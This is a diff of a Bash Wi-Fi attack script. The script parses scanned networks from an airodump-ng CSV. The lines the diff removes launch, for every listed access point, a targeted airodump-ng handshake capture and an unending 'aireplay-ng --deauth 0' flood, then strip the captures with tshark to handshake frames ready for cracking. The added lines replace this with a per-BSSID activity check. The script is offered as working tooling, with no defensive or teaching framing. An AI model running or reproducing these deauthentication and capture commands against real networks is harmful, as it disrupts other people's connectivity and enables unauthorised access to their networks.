@@ -22,13 +22,12 @@ function startadump() {
 }
 
 function recuperaredes() {
-
     lines=$(wc -l 'redes/redes-01.csv' | awk '{print $1}')
     numline=$((lines))
 
     maclist=()
     chanlist=()
-    cryolist=()
+    cryplist=()
     keylist=()
     
     while IFS=',' read -r mac _ _ chan _ cryp _ _ _ _ _ _ _ key
@@ -48,24 +47,20 @@ function recuperaredes() {
                 key="${key%,}"
             fi
 
-
             maclist+=("$mac")
             chanlist+=($chan)
             cryplist+=($cryp)
             keylist+=($key)
 
-
         fi
         numline=$((numline-1))
     done < redes/redes-01.csv
+    #echo "saliendo aca"
     
-    beacon "$(declare -p maclist)" "$(declare -p chanlist)" "$(declare -p cryplist)" "$(declare -p keylist)" & beacon_pid=$! 
-    wait $beacon_pid
+    listaredesactivas "$(declare -p maclist)" "$(declare -p chanlist)" "$(declare -p cryplist)" "$(declare -p keylist)"
 }
 
-
-
-function beacon() {
+function listaredesactivas() {
     local maclist chanlist cryplist keylist
     eval "$(echo "$1")"
     eval "$(echo "$2")"
@@ -73,39 +68,11 @@ function beacon() {
     eval "$(echo "$4")"
 
     for ((i=0; i<${#maclist[@]}; i++)); do
-        (
-            xterm -T "dump" -e sudo airodump-ng -w caps/${keylist[$i]} -c ${chanlist[$i]} --bssid ${maclist[$i]} wlan0 &
-        ) &
-        
-        (
-            xterm -T "play" -e sudo aireplay-ng --deauth 0 -a ${maclist[$i]} wlan0 &
-        ) &
-
-        sleep 3
-    done
-    wait
-    sleep 30
-    sharky
-    
-
-}
-
-
-
-function sharky(){ 
-
-    # Specify the folder containing the .cap files
-    folder="caps/"
-
-    for capfile in "$folder"/*.cap; do
-        if [ -f "$capfile" ]; then
-            filename_noext=$(basename -- "$capfile" .cap)
-
-            tshark -r "$capfile" -R "(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol)" -2 -F pcapng -w "caps/tsharks/${filename_noext}_stripped.pcapng"
-        fi
+        echo "test"
+        #xterm -T "verifica si activa" -e sudo airodump-ng wlan0mon -d ${maclist[$i]}  &
+        airodump-ng -d ${maclist[$i]} --uptime 5 wlan0 &
+        sleep 3     
     done
 }
-
-
 
 wlan0monitor
